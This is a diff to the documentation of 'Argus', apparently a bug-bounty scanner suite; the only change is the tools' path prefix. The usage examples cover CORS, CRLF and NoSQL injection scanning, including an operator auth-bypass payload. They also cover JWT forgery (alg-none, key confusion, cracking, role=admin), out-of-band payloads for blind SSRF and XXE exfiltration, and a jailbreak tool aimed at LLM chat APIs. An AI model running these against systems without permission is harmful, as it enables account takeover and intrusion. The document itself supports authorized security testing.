@@ -29,8 +29,8 @@ description: Argus — the all-seeing scanner suite. Six automated scanners for 
 ## 1. CORS — `/cors`
 
 ```bash
-tools/cors_scanner.py https://api.target.com/me --cookie "session=..."
-tools/cors_scanner.py -l recon/target.com/urls/api.txt --json
+bughunter/tools/cors_scanner.py https://api.target.com/me --cookie "session=..."
+bughunter/tools/cors_scanner.py -l recon/target.com/urls/api.txt --json
 ```
 
 Sends crafted `Origin` headers, classifies `Access-Control-Allow-Origin` /
@@ -46,7 +46,7 @@ Sends crafted `Origin` headers, classifies `Access-Control-Allow-Origin` /
 ## 2. CRLF / host-header — `/crlf`
 
 ```bash
-tools/crlf_scanner.py "https://target.com/r?u=x" --host-header
+bughunter/tools/crlf_scanner.py "https://target.com/r?u=x" --host-header
 ```
 
 Injects encoded CRLF (`%0d%0a`, double-encoded, UTF-8 overlong `%E5%98%8A%E5%98%8D`)
@@ -61,8 +61,8 @@ open redirect, cache poisoning, reset poisoning.
 ## 3. NoSQL injection — `/nosqli`
 
 ```bash
-tools/nosqli_scanner.py --login https://t/api/login --user-field email --pass-field password
-tools/nosqli_scanner.py --query "https://t/api/items?id=1"   # emits bracket variants
+bughunter/tools/nosqli_scanner.py --login https://t/api/login --user-field email --pass-field password
+bughunter/tools/nosqli_scanner.py --query "https://t/api/items?id=1"   # emits bracket variants
 ```
 
 - Operator auth-bypass: `{"email":{"$ne":null},"password":{"$ne":null}}`
@@ -75,10 +75,10 @@ Sends a wrong-credential baseline first, flags a finding when status flips
 ## 4. JWT attacks — `/jwt-scan` (offline)
 
 ```bash
-tools/jwt_scanner.py "$TOKEN" --analyze
-tools/jwt_scanner.py "$TOKEN" --alg-none --set role=admin
-tools/jwt_scanner.py "$TOKEN" --confuse --public-key jwks_pub.pem --set role=admin
-tools/jwt_scanner.py "$TOKEN" --crack --wordlist secrets.txt
+bughunter/tools/jwt_scanner.py "$TOKEN" --analyze
+bughunter/tools/jwt_scanner.py "$TOKEN" --alg-none --set role=admin
+bughunter/tools/jwt_scanner.py "$TOKEN" --confuse --public-key jwks_pub.pem --set role=admin
+bughunter/tools/jwt_scanner.py "$TOKEN" --crack --wordlist secrets.txt
 ```
 
 - `--alg-none` — strip signature, set `alg` to none/None/NONE/nOnE.
@@ -96,11 +96,11 @@ correlating interactsh callbacks to the firing payload.
 
 ```bash
 # 1. listener (prints your OOB domain, streams interactions)
-tools/oob_listener.py --listen > inter.jsonl
+bughunter/tools/oob_listener.py --listen > inter.jsonl
 # 2. payloads embedding a unique marker per injection point
-tools/oob_listener.py --payloads cXXXX.oast.fun --json > payloads.json
+bughunter/tools/oob_listener.py --payloads cXXXX.oast.fun --json > payloads.json
 # 3. correlate received callbacks
-tools/oob_listener.py --correlate inter.jsonl --payloads-file payloads.json
+bughunter/tools/oob_listener.py --correlate inter.jsonl --payloads-file payloads.json
 ```
 
 Covers blind SSRF, XXE (incl. OOB-DTD exfil), SQLi (MSSQL `xp_dirtree` / MySQL
@@ -115,8 +115,8 @@ whole band of Critical findings is otherwise un-submittable.
 ## 6. LLM red-team — `/llm-redteam`
 
 ```bash
-tools/llm_redteam.py --url https://t/api/chat --field message
-tools/llm_redteam.py --url https://t/api/chat \
+bughunter/tools/llm_redteam.py --url https://t/api/chat --field message
+bughunter/tools/llm_redteam.py --url https://t/api/chat \
   --template '{"messages":[{"role":"user","content":"{{PAYLOAD}}"}]}' \
   --response-path choices.0.message.content --category jailbreak
 ```
